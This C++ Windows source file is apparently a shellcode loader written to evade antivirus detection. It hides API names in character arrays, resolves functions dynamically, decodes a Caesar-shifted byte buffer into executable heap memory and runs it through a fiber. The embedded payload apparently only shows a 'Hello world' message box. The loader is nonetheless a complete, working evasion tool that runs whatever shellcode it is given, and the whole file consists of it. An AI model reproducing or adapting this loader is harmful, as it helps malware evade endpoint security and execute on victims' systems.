#include <iostream>
#include <Windows.h>

typedef BOOL(WINAPI* pfnVirtualProtect)(
	IN  LPVOID lpAddress,
	IN  SIZE_T dwSize,
	IN  DWORD  flNewProtect,
	OUT PDWORD lpflOldProtect
	);

typedef LPVOID(WINAPI* pfnCreateFiber)(
	IN          SIZE_T                dwStackSize,
	IN          LPFIBER_START_ROUTINE lpStartAddress,
	IN OPTIONAL	LPVOID                lpParameter
	);

typedef void (WINAPI* pfnSwitchToFiber)(
	IN OPTIONAL LPVOID lpParameter
	);

typedef LPVOID(WINAPI* pfnConvertThreadToFiber)(
	IN OPTIONAL LPVOID lpParameter
	);


typedef HANDLE(WINAPI* pfnHeapCreate)(
	IN DWORD	flOptions,
	IN SIZE_T	dwInitialSize,
	IN SIZE_T	dwMaximumSize
	);

typedef LPVOID(WINAPI* pfnHeapAlloc)(
	IN	HANDLE	hHandle,
	IN	DWORD	dwFlags,
	IN	SIZE_T	dwBytes
	);


typedef void(__stdcall* pfnSleep)(DWORD dwMilliseconds);

WCHAR k32[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0x0 };
char strCreateFiber[] = { 'C','r','e','a','t','e','F','i','b','e','r', 0x0 };

char strVirtualProtect[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0x0 };
char strSwitchToFiber[] = { 'S','w','i','t','c','h','T','o','F','i','b','e','r', 0x0 };
char strConvertThreadToFiber[] = { 'C','o','n','v','e','r','t','T','h','r','e','a','d','T','o','F','i','b','e','r', 0x0 };
char strHeapAlloc[] = { 'H','e','a','p','A','l','l','o','c', 0x0 };
char strHeapCreate[] = { 'H','e','a','p','C','r','e','a','t','e', 0x0 };
char strSleep[] = { 'S','l','e','e','p', 0x0 };

pfnVirtualProtect pVirtualProtect = (pfnVirtualProtect)GetProcAddress(GetModuleHandleW((LPCWSTR)k32), strVirtualProtect);
pfnCreateFiber pCreateFiber = (pfnCreateFiber)GetProcAddress(GetModuleHandleW((LPCWSTR)k32), strCreateFiber);
pfnSwitchToFiber pSwitchToFiber = (pfnSwitchToFiber)GetProcAddress(GetModuleHandleW((LPCWSTR)k32), strSwitchToFiber);
pfnConvertThreadToFiber pConvertThreadToFiber = (pfnConvertThreadToFiber)GetProcAddress(GetModuleHandleW((LPCWSTR)k32), strConvertThreadToFiber);
pfnHeapCreate pHeapCreate = (pfnHeapCreate)GetProcAddress(GetModuleHandleW((LPCWSTR)k32), strHeapCreate);
pfnHeapAlloc pHeapAlloc = (pfnHeapAlloc)GetProcAddress(GetModuleHandleW((LPCWSTR)k32), strHeapAlloc);
pfnSleep pSleep = (pfnSleep)GetProcAddress(GetModuleHandleW((LPCWSTR)k32), strSleep);

unsigned char buf[] = "\x73\xae\x17\x53\x73\xae\x0f\x1b\x73\xb8\x40\x91\x2b\x2b\x2b\x73\xb8\x38\x7d\x2b\x2b\x2b\x13\xc9\x2b\x2b\x2b\x77\xb6\x23\x73\xb8\x38\x88\x2b\x2b\x2b\x2a\xfb\x73\xb8\x40\x8a\x2b\x2b\x2b\x73\xb8\x38\x78\x2b\x2b\x2b\x13\xaa\x2b\x2b\x2b\x78\x5e\xf4\x77\xb8\x30\x8c\x2b\x2b\x2b\x73\xb8\x40\x79\x2b\x2b\x2b\x73\x5e\xf4\x2a\xfb\x73\xb8\x40\x81\x2b\x2b\x2b\x73\xb8\x38\x35\x2b\x2b\x2b\x13\x81\x2b\x2b\x2b\x73\x5e\xf4\x2a\xfb\x76\x70\x7d\x79\x70\x77\x5e\x5d\x59\x6f\x77\x77\x2b\x77\x9a\x8c\x8f\x77\x94\x8d\x9d\x8c\x9d\xa4\x6c\x2b\x80\x7e\x70\x7d\x5e\x5d\x59\x6f\x77\x77\x2b\x78\x90\x9e\x9e\x8c\x92\x90\x6d\x9a\xa3\x6c\x2b\x73\x90\x97\x97\x9a\x4b\xa2\x9a\x9d\x97\x8f\x2b\x78\x90\x9e\x9e\x8c\x92\x90\x2b\x70\xa3\x94\x9f\x7b\x9d\x9a\x8e\x90\x9e\x9e\x2b\x73\xae\x17\x53\x90\x77\xb6\x2f\x50\x8b\x2b\x2b\x2b\x78\xb6\x6b\x43\x78\xb8\x8b\x3b\x78\xb6\x2f\x4f\x27\x74\xb6\xa3\x8b\x73\xb6\x1c\xd7\xaf\xeb\x9f\x51\xb5\x52\xab\x27\x8c\xa7\x2e\xab\x17\x4b\x65\x0b\xa0\x33\x73\x2a\xf2\x73\x2a\xf2\x16\x10\x78\xb6\x2b\x78\x66\xef\xa0\x01\x73\x5e\xeb\x14\xd2\x2b\x2b\x2b\x74\xb6\x83\x5b\x6f\xb6\x76\x67\x77\x2e\xf6\x74\xac\xec\xb3\x2b\x2b\x2b\x70\xb6\x54\x78\xb0\x18\xa0\x33\x73\x5e\xeb\x14\xb0\x2b\x2b\x2b\x79\xb8\x2f\x56\x70\xb6\x9c\x2f\x78\x2e\x20\x6c\xb6\x73\x43\x70\xb6\x7b\x4b\x77\x2e\xfe\x2a\xf4\x78\xb8\x37\xb5\x6c\xb6\x64\x73\x2e\x26\x73\xb6\x1d\xd1\xa0\x33\xb5\x31\xaf\xeb\x9f\x34\x16\x20\x0d\x11\x73\x5e\xeb\x16\x79\x70\xb6\x73\x4f\x77\x2e\xf6\x91\x6c\xb6\x37\x74\x70\xb6\x73\x47\x77\x2e\xf6\x6c\xb6\x2f\xb4\x74\x66\xf0\xa7\x5a\x74\x66\xf1\x9e\x55\x73\xb8\x5f\x43\x73\xb8\xa7\x4f\x5b\x77\xb6\x12\xcf\xab\x69\x59\xa0\x25\xcf\xf2\x32\x6f\x77\x77\x2b\x74\xb6\xf7\x6c\x2a\x02\x74\xb6\xf7\x73\xb6\x01\x14\x3f\x2a\x2a\x2a\x73\x2e\xee\x73\xae\xef\x53\xee\x2b";
SIZE_T bufSize = sizeof(buf);

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, INT nCmdShow) {
//int main() {
	
	LPVOID cFiber = NULL;
	LPVOID hAlloc = NULL;

	//pSleep(5000);

	// Convert current thread to fiber
	LPVOID ThreadToFiber = pConvertThreadToFiber(NULL);

	PVOID hHandle = pHeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 2048);
	hAlloc = pHeapAlloc(hHandle, HEAP_ZERO_MEMORY, bufSize);

	// Caesar decryption
	for (int i = 0; i < bufSize; i++) {
		//pSleep(10);
		buf[i] = (unsigned char)(((unsigned int)buf[i] - 58923) & 0xFF);
	}

	memmove_s(hAlloc, bufSize, buf, bufSize);

	cFiber = pCreateFiber(NULL, (LPFIBER_START_ROUTINE)hAlloc, NULL);
	if (cFiber == NULL) { return -2; }

	DWORD oldProtection = 0;
	if (!pVirtualProtect(hAlloc, bufSize, PAGE_EXECUTE, &oldProtection)) { return -2; };

	pSwitchToFiber(cFiber);

	return 0;
}